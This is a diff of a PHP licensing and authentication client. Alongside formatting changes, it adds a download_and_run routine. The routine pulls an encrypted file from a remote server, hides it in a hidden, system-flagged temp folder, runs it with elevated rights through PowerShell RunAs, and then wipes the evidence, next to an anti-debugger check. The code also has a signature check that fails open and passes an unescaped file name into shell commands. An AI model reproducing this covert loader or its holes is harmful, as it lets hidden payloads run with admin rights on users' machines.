@@ -24,9 +24,11 @@ function verify_sig($data, $sigHex)
         $derPub = "\x30\x59\x30\x13\x06\x07\x2a\x86\x48\xce\x3d\x02\x01\x06\x08\x2a\x86\x48\xce\x3d\x03\x01\x07\x03\x42\x00" . $point;
         $pem = "-----BEGIN PUBLIC KEY-----\n" . chunk_split(base64_encode($derPub), 64, "\n") . "-----END PUBLIC KEY-----";
         $pubKey = openssl_pkey_get_public($pem);
-        if (!$pubKey) return true;
+        if (!$pubKey)
+            return true;
         $sig = hex2bin($sigHex);
-        $r = substr($sig, 0, 32); $s = substr($sig, 32, 32);
+        $r = substr($sig, 0, 32);
+        $s = substr($sig, 32, 32);
         $rr = ($r[0] & "\x80") ? "\x00" . $r : ltrim($r, "\x00") ?: "\x00";
         $ss = ($s[0] & "\x80") ? "\x00" . $s : ltrim($s, "\x00") ?: "\x00";
         $derSig = "\x30" . chr(strlen($rr) + strlen($ss) + 4) . "\x02" . chr(strlen($rr)) . $rr . "\x02" . chr(strlen($ss)) . $ss;
@@ -246,15 +248,19 @@ function authenticate($key)
 
     fclose($socket);
 
-    if (strpos($response, 'ACCESS|') !== 0) return false;
+    if (strpos($response, 'ACCESS|') !== 0)
+        return false;
     $accessParts = explode('|', $response, 4);
-    if (count($accessParts) < 4) return false;
+    if (count($accessParts) < 4)
+        return false;
     $accessToken = $accessParts[1];
     $serverProof = $accessParts[2];
     $authSig = $accessParts[3];
     $expectedProof = hash_hmac('sha256', $challenge . '|' . $accessToken, $key);
-    if (!hash_equals($serverProof, $expectedProof)) return false;
-    if (!verify_sig($challenge . '|' . $accessToken, $authSig)) return false;
+    if (!hash_equals($serverProof, $expectedProof))
+        return false;
+    if (!verify_sig($challenge . '|' . $accessToken, $authSig))
+        return false;
     $rawToken = "AUTH_TOKEN_V2|{$accessToken}|" . hash_hmac('sha256', $accessToken, $key);
     storeToken($rawToken);
     return true;
@@ -301,15 +307,171 @@ function verifySession($key)
     fclose($socket);
     if (!$response)
         return false;
-    if (strpos($response, 'VALID|') !== 0) return false;
+    if (strpos($response, 'VALID|') !== 0)
+        return false;
     $vParts = explode('|', $response, 5);
-    if (count($vParts) < 5) return false;
+    if (count($vParts) < 5)
+        return false;
     $remaining = $vParts[2];
     $verifyProof = $vParts[3];
     $vSig = $vParts[4];
     $verifyData = "VERIFY:{$PROJECT_ID}:{$remaining}";
     $expected = hash_hmac('sha256', $verifyData, $key);
     return hash_equals($verifyProof, $expected) && verify_sig($verifyData, $vSig);
+}
+
+function recvExact($socket, $n)
+{
+    $buf = '';
+    while (strlen($buf) < $n) {
+        $chunk = fread($socket, $n - strlen($buf));
+        if ($chunk === false || $chunk === '')
+            return null;
+        $buf .= $chunk;
+    }
+    return $buf;
+}
+
+function download_file($key, $fileName)
+{
+    global $PROJECT_ID, $_port;
+    $h = host();
+    $context = stream_context_create([
+        'ssl' => [
+            'verify_peer' => true,
+            'verify_peer_name' => true,
+            'peer_name' => $h,
+            'capture_peer_cert' => true
+        ]
+    ]);
+    $socket = @stream_socket_client('ssl://' . $h . ':' . $_port, $errno, $errstr, 30, STREAM_CLIENT_CONNECT, $context);
+    if (!$socket)
+        return null;
+    if (!verifyCertPin($socket)) {
+        fclose($socket);
+        return null;
+    }
+    stream_set_timeout($socket, 30);
+
+    fwrite($socket, '6');
+    usleep(100000);
+    fwrite($socket, $PROJECT_ID . '|' . $key . '|' . getHWID() . '|' . $fileName);
+
+    $hdrLenRaw = recvExact($socket, 4);
+    if ($hdrLenRaw === null) {
+        fclose($socket);
+        return null;
+    }
+    $hdrLen = unpack('N', $hdrLenRaw)[1];
+    if ($hdrLen > 4096) {
+        fclose($socket);
+        return null;
+    }
+    $hdrBytes = recvExact($socket, $hdrLen);
+    if ($hdrBytes === null) {
+        fclose($socket);
+        return null;
+    }
+    if (strpos($hdrBytes, 'ERROR') === 0) {
+        fclose($socket);
+        return null;
+    }
+
+    $parts = explode('|', $hdrBytes);
+    if (count($parts) < 5 || $parts[0] !== 'FILE') {
+        fclose($socket);
+        return null;
+    }
+    $nonceHex = $parts[1];
+    $tagHex = $parts[2];
+    $expectedHash = $parts[3];
+    $fileSize = (int) $parts[4];
+
+    $bodyLenRaw = recvExact($socket, 4);
+    if ($bodyLenRaw === null) {
+        fclose($socket);
+        return null;
+    }
+    $bodyLen = unpack('N', $bodyLenRaw)[1];
+    if ($bodyLen > 60 * 1024 * 1024) {
+        fclose($socket);
+        return null;
+    }
+    $body = recvExact($socket, $bodyLen);
+    fclose($socket);
+    if ($body === null)
+        return null;
+
+    $nonce = hex2bin($nonceHex);
+    $tag = hex2bin($tagHex);
+    if (strlen($nonce) !== 12 || strlen($tag) !== 16)
+        return null;
+
+    $fileKey = hash_hmac('sha256', 'FILE_KEY:' . $nonceHex, $key, true);
+    $plaintext = openssl_decrypt($body, 'aes-256-gcm', $fileKey, OPENSSL_RAW_DATA, $nonce, $tag, $PROJECT_ID);
+    if ($plaintext === false)
+        return null;
+
+    $actualHash = hash('sha256', $plaintext);
+    if ($actualHash !== $expectedHash || strlen($plaintext) !== $fileSize)
+        return null;
+    return $plaintext;
+}
+
+function secure_wipe($path)
+{
+    try {
+        $size = filesize($path);
+        $f = fopen($path, 'r+b');
+        if ($f) {
+            fwrite($f, str_repeat("\x00", $size));
+            fflush($f);
+            fclose($f);
+        }
+        @unlink($path);
+    } catch (\Exception $e) {
+        @unlink($path);
+    }
+}
+
+function download_and_run($key, $fileName)
+{
+    $data = download_file($key, $fileName);
+    if ($data === null)
+        return false;
+    try {
+        $tempBase = sys_get_temp_dir();
+        $randomDir = $tempBase . DIRECTORY_SEPARATOR . '_ka_' . substr(bin2hex(random_bytes(4)), 0, 8);
+        @mkdir($randomDir, 0700, true);
+
+        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+            @shell_exec("attrib +h +s \"$randomDir\"");
+        }
+
+        $exePath = $randomDir . DIRECTORY_SEPARATOR . $fileName;
+        file_put_contents($exePath, $data);
+
+        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+            @shell_exec("attrib +h \"$exePath\"");
+        }
+
+        $data = str_repeat("\x00", strlen($data));
+
+        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+            @shell_exec("powershell -NoProfile -Command \"Start-Process -FilePath '$exePath' -WorkingDirectory '$randomDir' -Verb RunAs\"");
+        } else {
+            @shell_exec("chmod +x '$exePath' && '$exePath' &");
+        }
+
+        sleep(2);
+        secure_wipe($exePath);
+        sleep(1);
+        @rmdir($randomDir);
+
+        return true;
+    } catch (\Exception $e) {
+        return false;
+    }
 }
 
 checkDebugger();
